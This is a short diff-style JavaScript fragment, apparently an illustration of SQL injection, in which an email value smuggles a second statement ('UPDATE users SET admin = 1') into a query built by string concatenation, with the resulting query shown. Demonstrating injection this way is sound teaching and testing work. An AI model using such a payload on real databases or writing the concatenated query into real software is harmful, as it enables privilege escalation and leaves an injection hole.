@@ -1,0 +1,7 @@
+const email = "attacker@example.com'); UPDATE users SET admin = 1 WHERE email = 'attacker@example.com';--";
+const query = "INSERT INTO users (email) VALUES ('" + email + "')";
+
+query;
+
+RESULT:
+"INSERT INTO users (email) VALUES ('attacker@example.com'); UPDATE users SET admin = 1 WHERE email = 'attacker@example.com';--')"
